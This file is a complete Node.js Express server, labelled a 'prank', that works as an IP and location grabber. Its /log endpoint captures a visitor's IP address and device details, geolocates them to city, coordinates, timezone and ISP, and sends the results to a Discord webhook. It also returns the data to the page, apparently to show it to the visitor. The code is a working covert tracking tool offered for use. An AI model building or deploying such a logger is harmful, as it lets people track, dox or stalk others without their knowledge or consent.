const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

// Use environment variable from Render dashboard (DISCORD_WEBHOOK)
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;

if (!DISCORD_WEBHOOK) {
  console.error('DISCORD_WEBHOOK environment variable is missing!');
}

// In-memory storage for last seen data per user (resets when server restarts)
const lastData = {};

// The prank logging endpoint
app.post('/log', async (req, res) => {
  // Get real client IP (Render uses proxy header)
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  if (ip && ip.includes(',')) ip = ip.split(',')[0].trim();

  const userID = req.body.userID || 'unknown';
  const deviceInfo = req.body.deviceInfo || {};

  try {
    // Fetch approximate location from IP
    const geoResp = await axios.get(`https://ipapi.co/${ip}/json/`);
    const geo = geoResp.data;
    if (geo.error) throw new Error(geo.reason || 'Geo lookup failed');

    // Build the full info object
    const fullInfo = {
      ip,
      city: geo.city || '???',
      region: geo.region || '???',
      country: geo.country_name || '???',
      lat: geo.latitude?.toFixed(3) || '???',
      lon: geo.longitude?.toFixed(3) || '???',
      timezone: geo.timezone || '???',
      isp: geo.org || '???',
      ...deviceInfo
    };

    // Check if anything changed since last time
    const last = lastData[userID];
    if (!last || JSON.stringify(last) !== JSON.stringify(fullInfo)) {
      if (DISCORD_WEBHOOK) {
        await axios.post(DISCORD_WEBHOOK, {
          content: `PRANK UPDATE (${new Date().toLocaleString()})\nUser: ${userID}\n` +
            Object.entries(fullInfo).map(([k, v]) => `${k}: ${v}`).join('\n')
        });
      }
    }

    // Remember this data for next time
    lastData[userID] = fullInfo;

    // Send back the info to the prank page
    res.json(fullInfo);
  } catch (err) {
    console.error('Error in /log:', err.message);
    res.status(500).json({ error: 'Failed' });
  }
});

// Simple root route to confirm server is alive
app.get('/', (req, res) => res.send('Prank server running!'));

// Start the server on the port Render gives us
const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Running on port ${port}`));
